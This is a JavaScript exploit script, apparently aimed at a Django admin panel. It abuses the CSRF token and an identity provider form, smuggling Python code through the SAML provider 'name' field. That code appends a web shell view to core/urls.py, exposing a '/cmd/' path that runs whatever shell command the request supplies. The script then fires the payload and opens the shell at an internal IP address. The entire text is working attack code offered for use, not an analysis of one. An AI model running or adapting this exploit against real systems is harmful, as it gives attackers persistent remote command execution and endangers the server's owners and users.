 (function() {
     function getCookie(n){let b=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return b?b.pop():''}
     const id = Math.floor(Math.random() * 9999);
     const slug = 'web-' + id;

     // This Python code appends a web shell view and URL pattern to core/urls.py
     // and then adds a new path '/cmd/' to the main Django application.
     const py = `
 import os
 path = '/APS/core/urls.py'
 with open(path, 'a') as f:
     f.write("\\nfrom django.http import HttpResponse\\n")
     f.write("def shell_view(request):\\n")
     f.write("    import os\\n")
     f.write("    return HttpResponse(os.popen(request.GET.get('c')).read())\\n")
     f.write("urlpatterns += [path('cmd/', shell_view)]\\n")
 `.replace(/\n/g, '');

     const name = `WebShell${id}\n${py}`;

     const formData = new FormData();
     formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
     formData.append('name', name);
     formData.append('slug', slug);
     formData.append('protocol', 'saml');
     formData.append('status', 'active');
     formData.append('priority', '0');
     formData.append('use_custom_attribute_map', 'on');
     formData.append('attribute_mapping', '{"email":["mail"]}');
     formData.append('saml_metadata_xml', `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
 protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
 Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>`);
     formData.append('_save', 'Save');

     console.log("Injecting Web Shell into Django core/urls.py...");
     fetch('/admin/uac/identityprovider/add/', { method: 'POST', body: formData })
     .then(r => {
         // Trigger the RCE to write the file
         new Image().src = '/saml2/login/' + slug + '/';
         console.log("Injection triggered. Waiting 3 seconds for Django to reload...");

         setTimeout(() => {
             console.log("Web shell ready at: http://10.81.2.47:8090/cmd/?c=id");
             window.open('http://10.81.2.47:8090/cmd/?c=id', '_blank');
         }, 3000);
     });
 })();


